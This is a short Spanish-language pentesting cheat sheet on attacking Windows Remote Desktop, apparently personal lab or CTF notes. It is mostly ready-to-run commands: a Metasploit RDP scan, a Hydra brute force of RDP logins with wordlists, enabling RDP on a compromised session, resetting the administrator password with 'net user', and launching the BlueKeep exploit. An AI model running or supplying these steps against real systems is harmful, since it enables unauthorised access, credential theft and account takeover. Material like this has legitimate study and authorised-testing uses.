----------------
- tags: #windows #rdp #rce #bluekeep #metasploit 
------------

### Comprobar si esta RDP detrás de un puerto x

	msfdb run
	search rdp_scanner
	use auxiliary/scanner/rdp/rdp_scanner
	set RHOSTS x.x.x.x
	SET RPORT 3333
	run

### Fuerza bruta con hydra

	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://x.x.x.x -s 3333

### Conectarse con xfreerdp
	xfreerdp /u:administrator /p:123456789 /v:x.x.x.x:3333

### Activarlo desde metasploit

	use post/windows/manage/enable_rdp
	set SESSION x
	exploit

(Cambiamos la contraseña del usuario administrador)

	net user administrator password123

	xfreerdp /u:administrator /p:password123 /v:x.x.x.x

## Explotar BlueKeep

	msfconsole
	seach BlueKeep
	use 1
	set RHOSTS x.x.x.x
	exploit
	show targets
	set target x
	exploit